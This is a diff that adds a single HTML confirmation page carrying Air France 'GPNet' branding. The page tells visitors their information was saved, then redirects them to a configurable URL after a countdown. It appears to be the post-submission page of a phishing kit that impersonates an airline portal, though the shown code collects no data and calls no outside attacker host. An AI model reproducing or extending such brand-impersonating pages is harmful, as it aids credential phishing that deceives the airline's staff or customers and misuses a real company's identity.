@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPNet - Confirmation</title>
+    <!-- Montserrat Google Font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #F4F5F7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        @keyframes countdownProgress {
+            from { width: 100%; }
+            to { width: 0%; }
+        }
+        .progress-bar-fill {
+            animation: countdownProgress 10s linear forwards;
+        }
+        img.crisp-img {
+            shape-rendering: crispEdges;
+            image-rendering: -webkit-optimize-contrast;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between">
+
+    <!-- Top Navigation Bar -->
+    <header class="bg-[#051039] text-white py-4 px-6 md:px-12 flex items-center justify-between shadow-md h-[84px]">
+        <div class="flex items-center space-x-10">
+            <a href="index.html" class="flex items-center">
+                <img src="images/1.png" alt="GPNet Logo" class="h-10 md:h-13 w-auto object-contain crisp-img">
+            </a>
+        </div>
+        <div class="flex items-center">
+            <img src="images/2.png" alt="Air France" class="h-8 md:h-10 w-auto object-contain crisp-img">
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex items-center justify-center py-10 px-4">
+        <div class="w-full max-w-[480px] bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100 text-center">
+            
+            <!-- Card Header -->
+            <div class="bg-[#051039] py-4 px-6 flex items-center justify-center h-[68px]">
+                <h1 id="card-header-title" class="text-white text-base md:text-lg font-bold tracking-wider uppercase">
+                    CONFIRMATION
+                </h1>
+            </div>
+
+            <!-- Card Body -->
+            <div class="p-8 md:p-10 space-y-6 flex flex-col items-center">
+                
+                <!-- Success Checkmark Icon -->
+                <div class="w-20 h-20 rounded-full bg-emerald-50 border-2 border-emerald-500/20 flex items-center justify-center shadow-inner">
+                    <svg class="w-10 h-10 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path>
+                    </svg>
+                </div>
+
+                <!-- Titles and Descriptions -->
+                <div class="space-y-2">
+                    <h2 id="thankyou-title" class="text-2xl font-extrabold text-[#051039]">
+                        Merci !
+                    </h2>
+                    <p id="thankyou-desc" class="text-sm md:text-base text-gray-600 font-medium leading-relaxed max-w-sm">
+                        Vos informations ont été enregistrées avec succès. Vous allez être redirigé vers le portail sécurisé.
+                    </p>
+                </div>
+
+                <!-- Countdown & Progress Bar Card -->
+                <div class="w-full bg-[#F4F5F7] rounded-xl p-4 space-y-3 border border-gray-200">
+                    <p id="timer-text" class="text-xs md:text-sm font-semibold text-gray-700">
+                        Redirection automatique dans <span id="countdown" class="font-extrabold text-[#1454BC] text-base">10</span> secondes...
+                    </p>
+                    <div class="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
+                        <div id="progress-bar" class="h-full bg-[#1454BC] rounded-full progress-bar-fill"></div>
+                    </div>
+                </div>
+
+                <!-- Redirect Button -->
+                <button id="redirect-btn"
+                        onclick="redirectNow()"
+                        class="w-full md:w-auto px-8 h-[46px] rounded-full font-semibold text-[15px] transition-all bg-[#1454BC] text-white hover:bg-[#0F4399] shadow-md hover:shadow-lg focus:outline-none">
+                    Continuer immédiatement
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer id="footer-text" class="py-4 text-center text-xs text-gray-400 font-medium">
+        &copy; GPNet Air France. Tous droits réservés.
+    </footer>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const lang = (urlParams.get('lang') || 'fr').toLowerCase();
+
+        const content = {
+            fr: {
+                docTitle: 'GPNet - Confirmation',
+                headerTitle: 'CONFIRMATION',
+                title: 'Merci !',
+                desc: 'Vos informations ont été enregistrées avec succès. Vous allez être redirigé vers le portail sécurisé.',
+                timerPrefix: 'Redirection automatique dans',
+                timerSuffix: 'secondes...',
+                button: 'Continuer immédiatement',
+                footer: '&copy; GPNet Air France. Tous droits réservés.'
+            },
+            en: {
+                docTitle: 'GPNet - Confirmation',
+                headerTitle: 'CONFIRMATION',
+                title: 'Thank You!',
+                desc: 'Your information has been successfully registered. You will be redirected to the secure portal.',
+                timerPrefix: 'Automatic redirection in',
+                timerSuffix: 'seconds...',
+                button: 'Continue immediately',
+                footer: '&copy; GPNet Air France. All rights reserved.'
+            }
+        };
+
+        const activeContent = content[lang] || content.fr;
+        document.title = activeContent.docTitle;
+        document.documentElement.lang = lang;
+        document.getElementById('card-header-title').innerText = activeContent.headerTitle;
+        document.getElementById('thankyou-title').innerText = activeContent.title;
+        document.getElementById('thankyou-desc').innerText = activeContent.desc;
+        document.getElementById('redirect-btn').innerText = activeContent.button;
+        document.getElementById('footer-text').innerHTML = activeContent.footer;
+
+        function updateTimerDisplay(remaining) {
+            document.getElementById('timer-text').innerHTML = activeContent.timerPrefix + ' <span id="countdown" class="font-extrabold text-[#1454BC] text-base">' + remaining + '</span> ' + activeContent.timerSuffix;
+        }
+
+        let targetUrl = 'https://www.google.com';
+        
+        async function loadConfig() {
+            try {
+                const res = await fetch('/api/config');
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.redirectUrl) {
+                        targetUrl = data.redirectUrl;
+                        return;
+                    }
+                }
+            } catch (e) {}
+            
+            try {
+                const mod = await import('./config.js');
+                if (mod.CONFIG && mod.CONFIG.REDIRECT_URL) {
+                    targetUrl = mod.CONFIG.REDIRECT_URL;
+                }
+            } catch (e) {
+                console.error("Config not found", e);
+            }
+        }
+        
+        loadConfig();
+
+        let secondsRemaining = 10;
+        updateTimerDisplay(secondsRemaining);
+
+        const interval = setInterval(() => {
+            secondsRemaining--;
+            if (secondsRemaining <= 0) {
+                clearInterval(interval);
+                redirectNow();
+            } else {
+                updateTimerDisplay(secondsRemaining);
+            }
+        }, 1000);
+
+        function redirectNow() {
+            window.location.href = targetUrl;
+        }
+    </script>
+</body>
+</html>
